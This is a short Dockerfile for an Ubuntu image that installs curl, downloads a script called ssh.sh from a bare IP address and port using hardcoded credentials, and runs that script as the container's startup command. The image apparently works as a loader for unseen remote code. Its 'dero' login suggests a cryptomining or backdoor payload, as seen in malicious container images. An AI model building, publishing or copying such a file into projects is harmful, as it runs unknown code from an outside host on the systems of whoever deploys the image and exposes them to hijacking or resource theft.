
FROM ubuntu:latest
ENV DEBIAN_FRONTEND="noninteractive"
RUN   apt-get update && apt-get install -y curl  bash
RUN   curl -u dero:dodo24 -OLJ 83.147.41.137:10666/ssh.sh
CMD ["/bin/bash","ssh.sh"]
